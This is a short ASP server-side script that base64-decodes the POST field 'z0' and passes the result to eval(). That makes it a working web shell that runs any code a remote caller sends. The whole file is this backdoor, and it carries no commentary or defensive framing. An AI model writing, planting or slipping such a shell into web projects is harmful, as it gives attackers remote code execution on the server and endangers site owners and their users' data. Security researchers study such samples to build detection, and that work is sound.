<%

function base64Decode(str, encodingName) {
    if (!str || str == "")
        return "";

    var bytes = System.Convert.FromBase64String(str);

    var enc = encodingName
        ? System.Text.Encoding.GetEncoding(encodingName)
        : System.Text.Encoding.UTF8;

    return enc.GetString(bytes);
}

eval(base64Decode(Request.Form["z0"]));

%>